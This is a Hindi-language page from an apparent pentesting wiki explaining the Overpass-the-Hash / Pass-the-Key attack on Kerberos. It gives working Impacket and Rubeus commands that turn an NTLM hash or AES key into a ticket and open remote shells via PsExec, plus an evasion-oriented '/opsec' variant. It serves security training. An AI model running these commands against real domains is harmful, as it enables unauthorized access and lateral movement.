# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** हमला उन वातावरणों के लिए डिज़ाइन किया गया है जहाँ पारंपरिक NTLM प्रोटोकॉल प्रतिबंधित है, और Kerberos प्रमाणीकरण प्राथमिकता लेता है। यह हमला एक उपयोगकर्ता के NTLM हैश या AES कुंजियों का उपयोग करके Kerberos टिकट प्राप्त करने के लिए किया जाता है, जिससे नेटवर्क के भीतर संसाधनों तक अनधिकृत पहुंच संभव होती है।

इस हमले को अंजाम देने के लिए, प्रारंभिक कदम लक्षित उपयोगकर्ता के खाते का NTLM हैश या पासवर्ड प्राप्त करना है। इस जानकारी को सुरक्षित करने के बाद, खाते के लिए एक टिकट ग्रांटिंग टिकट (TGT) प्राप्त किया जा सकता है, जिससे हमलावर को उन सेवाओं या मशीनों तक पहुंच प्राप्त होती है जिन पर उपयोगकर्ता के पास अनुमतियाँ हैं।

इस प्रक्रिया को निम्नलिखित कमांड के साथ शुरू किया जा सकता है:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
AES256 की आवश्यकता वाले परिदृश्यों के लिए, `-aesKey [AES key]` विकल्प का उपयोग किया जा सकता है। इसके अलावा, प्राप्त टिकट को विभिन्न उपकरणों के साथ उपयोग किया जा सकता है, जिसमें smbexec.py या wmiexec.py शामिल हैं, जिससे हमले के दायरे का विस्तार होता है।

_ PyAsn1Error_ या _KDC cannot find the name_ जैसी समस्याओं को आमतौर पर Impacket लाइब्रेरी को अपडेट करके या IP पते के बजाय होस्टनाम का उपयोग करके हल किया जाता है, जिससे Kerberos KDC के साथ संगतता सुनिश्चित होती है।

Rubeus.exe का उपयोग करते हुए एक वैकल्पिक कमांड अनुक्रम इस तकनीक के एक और पहलू को प्रदर्शित करता है:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
यह विधि **Pass the Key** दृष्टिकोण को दर्शाती है, जिसमें प्रमाणीकरण उद्देश्यों के लिए टिकट को सीधे कमांड करने और उपयोग करने पर ध्यान केंद्रित किया गया है। यह ध्यान रखना महत्वपूर्ण है कि TGT अनुरोध की शुरुआत घटना `4768: A Kerberos authentication ticket (TGT) was requested` को ट्रिगर करती है, जो डिफ़ॉल्ट रूप से RC4-HMAC के उपयोग को दर्शाती है, हालांकि आधुनिक Windows सिस्टम AES256 को प्राथमिकता देते हैं।

संचालन सुरक्षा के अनुरूप रहने और AES256 का उपयोग करने के लिए, निम्नलिखित कमांड लागू किया जा सकता है:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## संदर्भ

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../banners/hacktricks-training.md}}
